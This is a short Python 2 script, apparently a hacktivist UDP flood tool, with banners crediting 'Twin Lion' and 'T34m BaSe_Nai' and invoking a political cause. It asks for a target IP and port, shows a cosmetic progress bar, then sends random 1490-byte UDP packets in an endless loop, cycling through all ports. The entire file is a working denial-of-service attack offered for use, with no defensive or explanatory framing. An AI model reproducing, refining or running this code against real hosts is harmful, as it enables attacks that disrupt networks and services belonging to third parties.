print ("\033[91m")
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet Badai Poisonous Base_Nai")
print
print "Coded By : Twin Lion"
print "Author   : T34m BaSe_Nai"
print "Github   : github.com/Twinlion24434"
print "Welcome Pejuang BRIGADE AL ASQA BASE_ NAI"
print "Note- Greetings All Hackers 🌏
Let's Take Part in the Struggle in the Humanitarian Mission to Defend Palestine"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")
os.system("clear")
print("\033[93m")
os.system("figlet Badai PoiSonoUs Base_Nai")
print("Team : BaSe_Nai")
print ("\033[92m")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet Badai PoiSonoUs Base_Nai to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

